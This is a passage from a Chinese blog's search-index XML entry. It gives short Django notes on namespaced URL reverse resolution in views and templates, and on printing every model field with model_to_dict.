class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> redirect(reverse(<span class="hljs-string">&quot;login&quot;</span>,kwargs=&#123;<span class="hljs-string">&quot;year&quot;</span>:<span class="hljs-number">3333</span>&#125;)<br></code></pre></td></tr></table></figure><p>对于存在app的urls.py中的反向解析:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">path(<span class="hljs-string">&quot;app01/&quot;</span>, include((<span class="hljs-string">&quot;app01.urls&quot;</span>,<span class="hljs-string">&quot;app01&quot;</span>)))  <br>path(<span class="hljs-string">&quot;app01/&quot;</span>, include((<span class="hljs-string">&quot;app02.urls&quot;</span>,<span class="hljs-string">&quot;app02&quot;</span>)))<br></code></pre></td></tr></table></figure><p>然后在app01和app02文件夹下的urls.py分别写入</p><p>在外部的views.py可以采用如下方式来</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">return</span> <span class="hljs-function"><span class="hljs-title">redirect</span>(<span class="hljs-title">reverse</span>(<span class="hljs-string">&quot;app名称:路由别名&quot;</span>))</span><br></code></pre></td></tr></table></figure><p>在html可以采用:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% url &quot;app名称：路由别名&quot; %&#125;<br></code></pre></td></tr></table></figure><p>数据库全字段显示</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from django<span class="hljs-selector-class">.forms</span><span class="hljs-selector-class">.models</span> import model_to_dict<br>from Book_info<span class="hljs-selector-class">.models</span> import Book<br>    allbook = Book<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.all</span>()<br>    <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> allbook:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">model_to_dict</span>(i))<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from django<span class="hljs-selector-class">.forms</span><span class="hljs-selector-class">.models</span> import model_to_dict<br>from Book_info<span class="hljs-selector-class">.models</span> import Book<br>    allbook = Book<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.all</span>()<br>    <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> allbook:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">model_to_dict</span>(i))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Django</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
